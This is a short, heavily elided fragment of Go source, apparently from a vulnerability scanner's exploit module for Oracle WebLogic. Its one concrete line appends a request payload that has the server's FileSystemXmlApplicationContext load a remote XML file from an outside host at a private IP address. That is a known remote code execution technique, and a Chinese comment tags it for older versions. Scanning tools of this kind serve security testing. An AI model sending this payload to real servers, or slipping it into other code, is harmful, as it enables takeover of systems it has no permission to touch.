...
func init() {
	...
	ExpManager.AddExploit(NewExploit(
		...
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			...
			if err != nil {
				// 低版本
				payloads = append(payloads, `?_nfpb=true&_pageLabel=HomePage1&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://172.16.30.34:1212/poc.xml")`)
